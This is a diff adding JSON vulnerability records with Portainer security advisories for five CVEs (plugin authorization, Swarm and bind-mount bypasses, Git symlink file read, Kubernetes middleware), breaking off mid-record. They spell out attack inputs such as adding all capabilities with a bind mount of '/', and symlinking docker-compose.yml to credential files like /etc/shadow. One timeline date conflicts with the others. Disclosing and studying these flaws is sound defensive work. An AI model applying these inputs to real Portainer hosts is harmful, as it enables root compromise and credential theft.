+      "canonical_id": "CVE-2026-44848",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "## Summary\n\nPortainer enforces Role-Based Access Control (RBAC) on top of the Docker API. The proxy layer routes incoming Docker API requests to per-resource handlers (containers, images, services, volumes, etc.) that apply authorization checks.\n\nThe Docker plugin management endpoints (`/plugins/*`) were not registered with a handler, so standard users with endpoint access could call privileged plugin operations \u2014 including installing and enabling plugins \u2014 directly against the underlying Docker daemon.\n\nThe vulnerability is exposed when a non-admin Portainer user (Standard User role, or any role granted endpoint-level access) has been given access to a Docker endpoint via Portainer RBAC. Administrators and users without Docker endpoint access are not affected.\n\nA regular user with access to a Docker endpoint can:\n\n- Pull an arbitrary plugin from any registry via `POST /plugins/pull`.\n- Grant it the privileges it requests, including `CAP_SYS_ADMIN` and host-path mounts.\n- Enable the plugin via `POST /plugins/{name}/enable`, at which point Docker runs the plugin with root privileges on the host.\n\nDocker plugins execute as root on the host and can request arbitrary host capabilities and mounts. Enabling a crafted plugin gives the user access to the host filesystem and equivalent to root on the Docker host.\n\n## Severity\n\n**Critical** \u2014 CVSS 9.4\n`CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`\n\n**CWE-862** \u2014 Missing Authorization\n\n## Affected Versions\n\nThe vulnerability exists in every Portainer release where the Docker API proxy uses the prefix-allowlist routing model \u2014 `/plugins` has never been in the allowlist, and the fall-through path has never applied authorization.\n\nFixes are included in the next release of each supported branch:\n\n| Branch              | First vulnerable | Fixed in   |\n|---------------------|------------------|------------|\n| 2.33.x (LTS)        | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS)        | 2.39.0           | **2.39.2** |\n| 2.40.x (STS)        | 2.40.0           | **2.41.0** |\n\nPortainer LTS branches receive fixes for 6 months plus a 3-month overlap after the next LTS ships. STS releases are supported only until the next STS ships \u2014 the 2.40.x STS line ends with the 2.41.0 release. All releases **prior to 2.33.0 are end-of-life** and will not receive a fix; users on EOL versions should upgrade to a supported LTS branch.\n\n## Workarounds\n\nAdministrators who cannot immediately upgrade can reduce exposure by temporarily **revoking Docker endpoint access for non-admin users** via Portainer RBAC until the patched release is deployed. This eliminates the attack surface without disruption for administrators. This does not replace the fix.\n\n## Affected Code\n\n```go\n// api/http/proxy/factory/docker/transport.go (pre-fix)\n\nvar prefixProxyFuncMap = map[string]func(...){\n    \"build\":      ...,\n    \"configs\":    ...,\n    \"containers\": ...,\n    \"images\":     ...,\n    \"networks\":   ...,\n    \"nodes\":      ...,\n    \"secrets\":    ...,\n    \"services\":   ...,\n    \"swarm\":      ...,\n    \"tasks\":      ...,\n    \"v2\":         ...,\n    \"volumes\":    ...,\n}\n\nfunc (transport *Transport) ProxyDockerRequest(request *http.Request) (*http.Response, error) {\n    // ...\n    prefix := strings.Split(strings.TrimPrefix(unversionedPath, \"/\"), \"/\")[0]\n\n    if proxyFunc := prefixProxyFuncMap[prefix]; proxyFunc != nil {\n        return proxyFunc(transport, request, unversionedPath)  // authorized\n    }\n\n    return transport.executeDockerRequest(request)  // forwarded without authorization\n}\n```\n\n`/plugins` is not in `prefixProxyFuncMap`, so requests to plugin endpoints fall through to `executeDockerRequest` and are forwarded to the Docker daemon without any Portainer-side authorization check.\n\n\n## Impact\n\nAn authenticated, non-admin Portainer user with access to any Docker-enabled endpoint can:\n\n- Install and enable arbitrary Docker plugins from any registry.\n- Execute plugin code with root privileges on the Docker host (including declaring `CAP_SYS_ADMIN` and host-path mounts).\n- Read and modify files on the host filesystem from a restricted account, overriding the administrator's security policy.\n\n## Timeline\n\n- 2026-03-16: Reported via GitHub Security Advisory by **ikkebr**.\n- 2026-04-20: Fix merged to `develop`, `release/2.39`, and `release/2.33`.\n- 2026-04-29: 2.41.0 released.\n- 2026-05-07: 2.39.2-LTS and 2.33.8-LTS released.\n\n## Credit\n\n- **ikkebr** \u2014 identified and reported the proxy allowlist bypass affecting the Docker plugin management endpoints.",
+      "first_seen": "2026-05-14T18:04:02.410274+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410274+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-rrmm-9v76-h3p4",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/releases/tag/2.41.0",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-rrmm-9v76-h3p4"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Portainer missing authorization on Docker plugin endpoints, which allows host RCE"
+    },
+    {
+      "canonical_id": "CVE-2026-44849",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "## Summary\n\nPortainer enforces seven `EndpointSecuritySettings` restrictions that administrators configure to restrict the container configurations non-admin users can launch: **privileged mode**, **host PID namespace**, **device mapping**, **capabilities**, **sysctls**, **security-opt (Seccomp / AppArmor)**, and **bind mounts**.\n\nThe vulnerability is exposed when a non-admin Portainer user (Standard User role, or any role granted endpoint-level access) has been given access to a Docker Swarm endpoint via Portainer RBAC. Admins and users without Swarm endpoint access are not affected.\n\nThese restrictions are enforced on the standard container creation path, but several of them are not applied on the Docker Swarm service API:\n\n- `POST /services/create` \u2014 **1 of 7** checks applied. `CapabilityAdd`, `CapabilityDrop`, `Sysctls`, and `Privileges` (Seccomp / AppArmor) are not parsed from the request body and are forwarded to the Docker daemon without validation.\n- `POST /services/{id}/update` \u2014 **0 of 7** checks applied. The route dispatches to the generic `restrictedResourceOperation`, which validates RBAC ownership but does not inspect the request body or call `fetchEndpointSecuritySettings()`.\n\nThe `EndpointSecuritySettings` checks apply when the administrator has configured any of `AllowContainerCapabilitiesForRegularUsers`, `AllowSysctlSettingForRegularUsers`, `AllowSecurityOptForRegularUsers`, or `AllowBindMountsForRegularUsers` to restrict standard users.\n\nA regular user with access to a Docker Swarm endpoint can:\n\n- Create a service with `CapabilityAdd: [\"SYS_ADMIN\", \"NET_ADMIN\", \"SYS_PTRACE\", \u2026]` or `Privileges.Seccomp.Mode: \"unconfined\"`.\n- Create a benign service that passes ownership checks, then **update** it to add `CapabilityAdd: [\"ALL\"]` plus a bind mount of `/`, scale to one replica, and access the host filesystem from the running container (e.g. via `chroot /host`).\n\nIn addition, the partial `Mounts[]` struct used by the bind-mount check inspects only the top-level `Type` field. A mount with `Type: \"volume\"` and `VolumeOptions.DriverConfig.Options: {type: \"none\", o: \"bind\", device: \"<host path>\"}` is forwarded to the Docker daemon unchanged; the local volume driver then materialises it as a bind-equivalent mount, bypassing `AllowBindMountsForRegularUsers`. The same field path is accepted by the standalone `POST /volumes/create` endpoint, which never had any `AllowBindMountsForRegularUsers` check on any branch.\n\nThis undermines the administrator's configured security policy on Swarm-enabled endpoints.\n\n## Affected Versions\n\nThe vulnerability exists in every Portainer release with Docker Swarm support \u2014 the service-creation path has never checked `CapabilityAdd`, `CapabilityDrop`, `Sysctls`, or `Privileges`, and the service-update path has never performed any `EndpointSecuritySettings` validation. The `VolumeOptions.DriverConfig` field has never been parsed by the partial service struct on any branch, so the volume-driver-bind variant (service create/update and direct `/volumes/create`) shares the same affected range.\n\nFixes are included in the next release of each supported branch:\n\n| Branch              | First vulnerable | Fixed in   |\n|---------------------|------------------|------------|\n| 2.33.x (LTS)        | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS)        | 2.39.0           | **2.39.2** |\n| 2.40.x (STS)        | 2.40.0           | **2.41.0** |\n\nPortainer LTS branches receive fixes for 6 months plus a 3-month overlap after the next LTS ships. STS releases are supported only until the next STS ships \u2014 the 2.40.x STS line ends with the 2.41.0 release. All releases **prior to 2.33.0 are end-of-life** and will not receive a fix; users on EOL versions should upgrade to a supported LTS branch.\n\n## Workarounds\n\nAdministrators who cannot immediately upgrade can reduce exposure with the following measures. None of these replaces the fix.\n\n- **Temporarily revoke Swarm endpoint access for non-admin users** via Portainer RBAC until the patched release is deployed. This eliminates the attack surface without service disruption for administrators.\n- **Segregate manager and worker nodes** with placement constraints so user workloads do not run on manager nodes. This limits the exposure of the Swarm control plane if the bypass is exploited against a worker.\n- **Block creation of local-driver volumes that use `type: none` / `o: bind`** on untrusted endpoints via a daemon-side allowlist. This closes the volume-driver-bind variant until the patched release is deployed.\n\n## Affected Code\n\n### Service creation \u2014 only `Mounts` inspected (1/7)\n\n```go\n// api/http/proxy/factory/docker/services.go (pre-fix)\n\ntype PartialService struct {\n    TaskTemplate struct {\n        ContainerSpec struct {\n            Mounts []struct {\n                Type string\n            }\n        }\n    }\n}\n```\n\n`CapabilityAdd`, `CapabilityDrop`, `Sysctls`, and `Privileges` are not declared in the struct, so `json.Unmarshal` does not include them in the validated view. The request body is then forwarded to the Docker daemon without those fields being checked.\n\n### Service update \u2014 no inspection (0/7)\n\n```go\n// api/http/proxy/factory/docker/transport.go (pre-fix)\n\nif match, _ := path.Match(\"/services/*/*\", requestPath); match {\n    serviceID := path.Base(path.Dir(requestPath))\n    // ... no body inspection, no call to fetchEndpointSecuritySettings ...\n    return transport.restrictedResourceOperation(\n        request, serviceID, serviceID,\n        portainer.ServiceResourceControl, false,\n    )\n}\n```\n\n`fetchEndpointSecuritySettings()` is called in three places in the codebase: container creation, service creation (bind-mount check only), and volume browsing. Service update is not among them.\n\n### Bind-mount check \u2014 driver options ignored\n\n```go\n// api/http/proxy/factory/docker/services.go (pre-fix \u2014 partial Mounts struct)\n\nMounts []struct {\n    Type string   // only this field was read\n}\n```\n\nBecause `VolumeOptions.DriverConfig.Options` is not declared in the partial struct, a mount of `Type: \"volume\"` passes the `Type != \"bind\"` check and is forwarded to the daemon. The local volume driver treats `{type: \"none\", o: \"bind\", device: \"<host path>\"}` as a bind-equivalent mount, so the check is bypassed.\n\nThe fix extends the partial struct to carry `VolumeOptions.DriverConfig.Options map[string]string`, rejects service create/update requests where that map declares a bind-style driver, and adds a new `CheckVolumeBodyRestrictions` invocation on `POST /volumes/create` (which previously had no `AllowBindMountsForRegularUsers` check on any branch).\n\n## Impact\n\nAn authenticated, non-admin Portainer user with access to any Docker Swarm-enabled endpoint can configure a service with:\n\n- **Elevated Linux capabilities** including `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, or `ALL` \u2014 not restricted by `AllowContainerCapabilitiesForRegularUsers`.\n- **Disabled syscall filtering** via `Privileges.Seccomp.Mode: \"unconfined\"` \u2014 not restricted by `AllowSecurityOptForRegularUsers`.\n- **Disabled AppArmor confinement** via `Privileges.AppArmor.Mode: \"disabled\"` \u2014 not restricted by `AllowSecurityOptForRegularUsers`.\n- **Arbitrary sysctl values** inside the container namespace \u2014 not restricted by `AllowSysctlSettingForRegularUsers`.\n- **Bind mounts of any host path**, including `/`, `/var/run/docker.sock`, SSH keys, or Portainer's own database \u2014 not restricted by `AllowBindMountsForRegularUsers`.\n- **Bind-mount-equivalent host filesystem access via volume driver options** \u2014 a `Type: \"volume\"` mount whose `VolumeOptions.DriverConfig.Options` describe a local-driver bind, or a direct `POST /volumes/create` with the same payload, yields the same capability as a direct bind and is not restricted by `AllowBindMountsForRegularUsers`.\n\nIn combination (e.g. `CapabilityAdd:[\"ALL\"]` + bind mount of `/`), this gives a user access equivalent to root on the Swarm manager host from a restricted account, overriding the administrator's security policy.\n\n## Timeline\n\n- `2026-03-12` \u2014 route2shell privately discloses the volume-driver local-bind variant.\n- `2026-04-05` \u2014 JohannesLks disclosure of the Swarm service create/update bypass\n- `2026-04-18`  \u2014 Fix merged to develop.\n- `2026-04-29` \u2014 2.41.0 released.\n- `2026-05-07` \u2014 2.39.2-LTS and 2.33.8-LTS released.\n## Credit\n\n- **route2shell** \u2014 disclosure of the volume-driver local-bind variant on both Swarm service creation/update and the standalone `/volumes/create` endpoint.\n- **JohannesLks** \u2014 independent disclosure of the Swarm service create/update bypass",
+      "first_seen": "2026-05-14T18:04:02.409840+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409840+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-5fxq-qcf3-244w",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/releases/tag/2.41.0",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-5fxq-qcf3-244w"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Portainer has an endpoint security bypass via Swarm service create/update"
+    },
+    {
+      "canonical_id": "CVE-2026-44850",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-863"
+      ],
+      "description": "## Summary\n\nPortainer offers an environment-level **Disable bind mounts for non-administrators** security setting that blocks regular users from binding host paths into containers they create through the Portainer-mediated Docker API. The check that enforces this setting only inspected the legacy `HostConfig.Binds` array on the container-create proxy and never looked at the equivalent `HostConfig.Mounts` array. Any authenticated user with rights to create containers on a Docker environment where the restriction is enabled could submit a `bind`-typed entry under `HostConfig.Mounts` and mount any host path into their container.\n\nThe two fields are interchangeable on the Docker daemon \u2014 both produce real bind mounts at runtime \u2014 so a check that inspects only one is functionally equivalent to no check at all. The same primitive is correctly enforced on Swarm service create against `TaskTemplate.ContainerSpec.Mounts`; the gap was specific to the `POST /containers/create` proxy path.\n\nExploitation requires a regular user with container-create rights on an environment that has the restriction enabled. Such a user can mount any host path read-write or read-only into a container they own and use the resulting view of the host filesystem to read or write anything the Docker daemon's user can \u2014 typically `root`. Bind-mount restriction is the primary defence against host filesystem exposure on shared environments where regular users are otherwise permitted to deploy containers.\n\n## Severity\n\n**High**\n\nThe vulnerability is exploitable over the network with low attack complexity, no attack requirement, and no user interaction. It requires a low-privilege authenticated session \u2014 any regular user with container-create rights on an environment where the bind-mount restriction is enabled. The vulnerable system (the Portainer container-create proxy) suffers a confidentiality and integrity breach by virtue of the bypass itself, but the dominant impact is on the subsequent system: the Docker host's filesystem and any container running alongside the attacker's. This is a restriction bypass rather than a cross-authority escalation \u2014 the user already had container-create rights, and the bind-mount restriction is a defence-in-depth control on top of that capability \u2014 which is the reason the rating is held at High rather than promoted to Critical despite the host-level reach.\n\n## Affected Versions\n\nThe vulnerability has existed since the `AllowBindMountsForRegularUsers` security setting was introduced. The `HostConfig.Mounts` field has never been inspected by the container-create proxy on any release line.\n\nFixes are included in the following releases:\n\n| Branch       | First vulnerable | Fixed in   |\n|--------------|------------------|------------|\n| 2.33.x (LTS) | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS) | 2.39.0           | **2.39.2** |\n| 2.41.x (STS) | all prior        | **2.41.0** |\n\nPortainer releases prior to 2.33.0 are end-of-life and will not receive a fix. Users on EOL versions should upgrade to a supported LTS branch.\n\n## Workarounds\n\nAdministrators who cannot immediately upgrade can reduce exposure by:\n\n- **Revoke container-create rights from non-administrator accounts on affected environments.** If the bind-mount restriction is being relied on as a hard guarantee, audit which non-administrator accounts have container-create rights on environments where it is set, and downgrade those accounts to roles that lack container-create until the patched release is deployed. Stack and service deployment that depends on container-create will stop working for those users until the patched release is in place.\n- **Audit recent container creations for `HostConfig.Mounts` of `Type: bind` from non-admin Portainer users.** Inspect Docker daemon logs and `docker inspect` output on affected environments. Any non-admin-created container with a bind-typed `Mounts` entry should be treated as a potential incident.\n- **Segregate tenants by environment.** Where the per-environment toggle was being used to share an environment between tenants of different trust levels, splitting the workloads onto separate environments is a stronger control than the toggle and remains in place after upgrade.\n\nNone of these replace the fix.\n\n## Affected Code\n\nThe enforcement lives in `decorateContainerCreationOperation` in `package/server-ce/api/http/proxy/factory/docker/containers.go`. The `PartialContainer` struct used to deserialise the request body for inspection only contained `HostConfig.Binds`:\n\n```\n// package/server-ce/api/http/proxy/factory/docker/containers.go\ntype PartialContainer struct {\n    HostConfig struct {\n        Privileged bool           `json:\"Privileged\"`\n        PidMode    string         `json:\"PidMode\"`\n        Devices    []any          `json:\"Devices\"`\n        Sysctls    map[string]any `json:\"Sysctls\"`\n        CapAdd     []string       `json:\"CapAdd\"`\n        CapDrop    []string       `json:\"CapDrop\"`\n        Binds      []string       `json:\"Binds\"`\n    } `json:\"HostConfig\"`\n}\n\nif !securitySettings.AllowBindMountsForRegularUsers && len(partialContainer.HostConfig.Binds) > 0 {\n    for _, bind := range partialContainer.HostConfig.Binds {\n        if strings.HasPrefix(bind, \"/\") {\n            return forbiddenResponse, ErrBindMountsForbidden\n        }\n    }\n}\n```\n\nThe fix adds a `Mounts` field to `PartialContainer` and a parallel check that rejects any entry whose `Type` equals `bind`, mirroring the existing logic on the Swarm service-create proxy. The container-update path is unaffected \u2014 the Docker daemon does not accept mount changes via container update \u2014 and Swarm service create was already covered. Compose-stack deployment is not in scope of this advisory; the bind-mount restriction is a daemon-mediated container-create control, and Compose deployment runs Docker through a separate path that is not currently subject to the same restriction.\n\nThe same change applies cleanly on each LTS branch \u2014 the surrounding code shape on `release/2.33` and `release/2.39` is identical to develop on the points the patch touches, so the LTS backports are byte-equivalent additions of the `Mounts` field and the parallel check.\n\n## Impact\n\nA regular user who has been explicitly restricted from using bind mounts can bypass the restriction and:\n\n- **Read or write any path on the Docker host filesystem.** The mount runs as the daemon user (typically `root`), so any path is reachable. Sensitive examples include `/etc/shadow`, host SSH keys under `/root/.ssh` and `/home/*/.ssh`, and TLS material under `/etc/docker`.\n- **Compromise other containers on the same host.** The host's `/var/lib/docker` (or equivalent) is reachable from within the bound mount, exposing the layers, volumes, and live state of every container the daemon manages.\n- **Reach the Docker socket.** Mounting `/var/run/docker.sock` into the attacker's container hands them full Docker API access on the host, regardless of any authorisation enforced by Portainer above the proxy.\n- **Write persistence to the host.** Without `ReadOnly`, the attacker can drop SSH keys into `authorized_keys`, install systemd units, or modify cron, achieving persistence outside of any container the daemon supervises.\n\nThe bind-mount restriction was the primary defence against this class of host exposure for non-administrator container creators; bypassing it removes the only enforcement point above the daemon for tenants who were granted container-create rights.\n\n## Timeline\n\n- 2026-03-04: Reported via GitHub Security Advisory by **offensiveee** (Assaf Alassaf).\n- 2026-03-04 \u2013 2026-04-17: Six further independent reports of the same primitive received via GitHub Security Advisory (alexwaira, ffulbtech, Proscan-one, jeroengui, AyushParkara, marduc812) and consolidated against this advisory.\n- 2026-04-18: Fix merged to `develop`.\n- 2026-06-04: Backports merged to `release/2.33` and `release/2.39`.\n- 2026-04-29: 2.41.0 released with fix.\n- 2026-05-07: 2.33.8, 2.39.2, released with fix.\n\n## Credit\n\n- **offensiveee** (Assaf Alassaf) \u2014 initial report identifying the `HostConfig.Mounts` bypass on container create and the divergence from the Swarm service-create check.\n- **alexwaira** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.\n- **ffulbtech** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.\n- **Proscan-one** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.\n- **jeroengui** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.\n- **AyushParkara** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.\n- **marduc812** \u2014 independently reported the same `HostConfig.Mounts` bypass on container create.",
+      "first_seen": "2026-05-14T18:04:02.410175+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410175+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-7fw3-x4r2-g7wc",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/releases/tag/2.41.0",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-7fw3-x4r2-g7wc"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Portainer has a bind-mount restriction bypass via HostConfig.Mounts"
+    },
+    {
+      "canonical_id": "CVE-2026-44881",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-200",
+        "CWE-59"
+      ],
+      "description": "## Summary\nPortainer supports deploying stacks from Git repositories. When a Git-backed stack is created or updated, Portainer clones the repository using `go-git` v5, which translates Git blob entries with mode `0o120000` (symlink) into real OS symlinks on the host filesystem via `os.Symlink`. The only entry blocked from becoming a symlink is `.gitmodules`; every other path \u2014 including `docker-compose.yml`, which Portainer treats as the stack entry point \u2014 is created as a symlink without validation.\n\nPortainer's `GET /api/stacks/{id}/file` endpoint then reads the stack entry point with `os.ReadFile`, which follows OS symlinks transparently. A repository containing `docker-compose.yml` as a symlink to an arbitrary filesystem path (for example `/etc/passwd` or a mounted Kubernetes service account token) causes the symlink target's contents to be returned verbatim in the HTTP response. Any authenticated user with rights to create or update a Git-backed stack \u2014 the default configuration in Portainer CE \u2014 can read arbitrary files accessible to the Portainer process.\n\nThe issue is amplified by Git-stack auto-update: an attacker can create a stack from a legitimate repository, pass initial review, and later push a commit that replaces `docker-compose.yml` with a symlink; the file read is then triggered on the next scheduled update cycle with no further interaction required.\n\n## Severity\n**High**\n\nAttack complexity is Low: the attacker needs only the ability to host a Git repository and the default-granted permission to create a Git-backed stack. Privilege required is Low in typical CE deployments, where non-admin users can manage their own stacks; administrators retain the same attack surface regardless of the setting. Impact on confidentiality is High \u2014 the Portainer process commonly runs as root (required for Docker socket access), so arbitrary file read includes `/etc/shadow`, Kubernetes service account tokens, Docker secrets, environment variables, and the Portainer database itself. Integrity and availability are not directly affected, but the leaked contents (service account tokens, registry credentials, database session keys) frequently enable onward compromise of the host and managed environments.\n\n## Affected Versions\nThe vulnerability exists in every Portainer release since the introduction of Git-based stack deployment support \u2014 Git-backed stacks have always performed an unrestricted `go-git` checkout and subsequently read the entry-point file through `os.ReadFile` without resolving symlinks.\n\nFixes are included in the following releases:\n\n| Branch       | First vulnerable | Fixed in   |\n|--------------|------------------|------------|\n| 2.33.x (LTS) | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS) | 2.39.0           | **2.39.2** |\n| 2.40.x (STS) | all prior        | **2.41.0** |\n\nPortainer releases prior to 2.33.0 are end-of-life and will not receive a fix. Users on EOL versions should upgrade to a supported LTS branch.\n\n## Workarounds\nAdministrators who cannot immediately upgrade can reduce exposure by:\n\n- **Restricting who can create Git-backed stacks.** Disable **Allow non-admin users to manage their stacks** in environment settings so that only administrators can submit a Git repository URL. This reduces the attack to an administrator-only surface but does not remove it.\n- **Avoiding untrusted repositories.** Do not deploy Git-backed stacks from repositories you do not control or review, and do not grant stack-management rights to users who can supply an arbitrary repository URL.\n- **Disabling auto-update on existing stacks.** Auto-update re-clones the repository on a schedule, which allows a repository that was safe at creation time to later become malicious. Disabling auto-update removes the deferred-exploitation path.\n- **Auditing existing stack working directories.** Search project paths under `/data/compose/` (or your configured data directory) for symlink entries \u2014 `find /data/compose -type l` \u2014 and treat any unexpected results as potential evidence of past exploitation.\n\nNone of these replace the fix.\n\n## Affected Code\nThe vulnerability is the combination of two primitives. `go-git` translates Git symlink entries into OS symlinks unconditionally (except `.gitmodules`):\n\n```go\n// go-git v5 \u2014 Worktree.checkoutFileSymlink\nfunc (w *Worktree) checkoutFileSymlink(f *object.File) (err error) {\n    if strings.EqualFold(f.Name, gitmodulesFile) {\n        return ErrGitModulesSymlink\n    }\n    // ... reads blob content as raw bytes ...\n    err = w.Filesystem.Symlink(string(bytes), f.Name)\n    return\n}\n```\n\nRelative symlink targets (`../../etc/passwd`) are passed through to `os.Symlink` as-is and escape the worktree at OS resolution time. (Absolute targets are chrooted to the worktree by `go-billy`'s `ChrootHelper.Symlink` and are not useful to the attacker.)\n\nOn the read side, `GetFileContent` in `api/filesystem/filesystem.go` applies lexical path containment but not symlink resolution:\n\n```go\nfunc (service *Service) GetFileContent(trustedRoot, filePath string) ([]byte, error) {\n    content, err := os.ReadFile(JoinPaths(trustedRoot, filePath))\n    return content, err\n}\n```\n\n`JoinPaths` prevents `../` traversal in the input string but does not call `filepath.EvalSymlinks`, so a symlink already written to the project path resolves through `os.ReadFile` to its ultimate target.\n\nThe fix wraps the `go-billy` filesystem used by the Git checkout with a custom `noSymlinkFS` type whose `Symlink()` method returns `ErrSymlinkDetected`, causing the clone to fail rather than write any OS symlink. Git trees that would otherwise produce a symlink entry are rejected at checkout time, closing the primary attack path. On the 2.33.x and 2.39.x branches the fix also hardens `GetFileContent` to call `filepath.EvalSymlinks` and verify the resolved path remains inside the trusted root, providing a second layer of defence against any future regression in Git-checkout handling.\n\n## Impact\n- **Arbitrary file read as the Portainer process.** Any file readable by the Portainer process \u2014 typically root in containerized deployments \u2014 can be returned through the stack file endpoint. Common targets include `/etc/shadow`, `/root/.ssh/*`, `/proc/self/environ`, and the Portainer BoltDB (`portainer.db`) which contains all user password hashes, API tokens, and agent credentials.\n- **Kubernetes service account token exposure.** Portainer running on Kubernetes has its cluster service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`; reading it grants the attacker the Portainer pod's cluster API access.\n- **Docker Swarm secret exposure.** Secrets mounted into the Portainer container at `/run/secrets/` (for example the initial admin password in Swarm deployments) are readable with the same mechanism.\n- **Onward compromise.** Leaked service tokens, registry credentials, and database contents frequently enable authenticated access to managed Docker/Kubernetes environments, container registries, and Portainer itself under other users' identities.\n- **Deferred exploitation via auto-update.** A repository that passes initial review at stack creation can be mutated afterwards; the malicious commit takes effect on the next auto-update cycle without user interaction.\n\n## Timeline\n- 2026-03-20: Reported via GitHub Security Advisory by **b-hermes**.\n- 2026-04-18: Fix merged to `develop`.\n- 2026-04-29: 2.41.0 released with fix.\n- 2026-05-07: 2.33.8, 2.39.2, released with fix.\n\n## Credit\n- **b-hermes** \u2014 identified the Git symlink injection primitive, traced the end-to-end chain through `GetFileContent`, and provided a fully validated proof-of-concept.",
+      "first_seen": "2026-05-14T18:04:02.410018+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410018+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-rpgq-m5fp-32wr",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/releases/tag/2.41.0",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-rpgq-m5fp-32wr"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Portainer Has an Arbitrary File Read via Git Symlink Injection in Stack Auto-Update"
+    },
+    {
+      "canonical_id": "CVE-2026-44882",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-863"
+      ],
+      "description": "## Summary\n\nPortainer proxies requests to Kubernetes clusters through a middleware layer (`kubeClientMiddleware`) that validates the requesting user's token before forwarding traffic to the cluster. When `security.RetrieveTokenData` returned an error, the middleware wrote an HTTP 403 response but was missing a `return` statement \u2014 execution continued into the handler with a nil `tokenData` value.\n\nThe Kubernetes endpoints sit behind Portainer's outer `AuthenticatedAccess` bouncer, so an attacker requires a valid Portainer session. However, a user whose secondary token validation fails in `kubeClientMiddleware` \u2014 for example a user without permission to access a given Kubernetes endpoint \u2014 would have their request forwarded to the cluster anyway, bypassing the authorization check. The same defect was present in both the CE and EE codebases.\n\n## Severity\n\n**High**\n**CWE-863** \u2014 Incorrect Authorization\n\nPrivilege required is Low \u2014 any valid Portainer session is sufficient to reach the middleware. Once the authorization outcome is bypassed, the attacker can read and modify Kubernetes resources on the target endpoint that their role should not permit \u2014 confidentiality and integrity impact are both High. No availability impact is introduced directly.\n\n## Affected Versions\n\nThe missing `return` statement has been present since Kubernetes proxy support was introduced.\n\n| Branch       | First vulnerable | Fixed in   |\n|--------------|------------------|------------|\n| 2.33.x (LTS) | 2.33.0           | **2.33.8** |\n\nPortainer 2.39.0 and later are not affected \u2014 the fix was present from the initial 2.39.0 release. All releases prior to 2.33.0 are end-of-life and will not receive a fix; users on EOL versions should upgrade to a supported release.\n\n## Workarounds\n\nThere is no configuration change that prevents the bypass directly. Administrators who cannot immediately upgrade can reduce exposure by:\n\n- **Restricting Kubernetes endpoint access.** Remove Portainer access to Kubernetes endpoints for users who do not require it. A user without endpoint access cannot reach `kubeClientMiddleware`.\n- **Auditing Kubernetes RBAC.** Ensure the service account Portainer uses to proxy cluster requests carries least-privilege RBAC permissions \u2014 this limits the blast radius if the bypass is exploited.\n\nNeither of these replaces the fix.\n\n## Affected Code\n\n`kubeClientMiddleware` in `api/http/handler/kubernetes/handler.go` wrote the error response but did not return, allowing execution to continue with nil `tokenData`:\n\n```go\n// api/http/handler/kubernetes/handler.go (pre-fix \u2014 CE and EE)\ntokenData, err := security.RetrieveTokenData(r)\nif err != nil {\n    httperror.WriteError(w, http.StatusForbidden,\n        \"permission denied to access the environment\", err)\n    // missing return \u2014 tokenData is nil, execution continues\n}\n\n// tokenData.ID dereferenced on the next line:\n_, ok := handler.KubernetesClientFactory.GetProxyKubeClient(\n    strconv.Itoa(endpointID), strconv.Itoa(int(tokenData.ID)))\n```\nThe fix adds a single return after the WriteError call in both CE and EE:\n\n```go\n// post-fix\nif err != nil {\n    httperror.WriteError(w, http.StatusForbidden,\n        \"permission denied to access the environment\", err)\n    return\n}\n```\n\n## Impact\n- Kubernetes authorization bypass. A low-privileged Portainer user can reach Kubernetes API endpoints on environments their role does not permit, with the proxy client of the legitimate session used as the 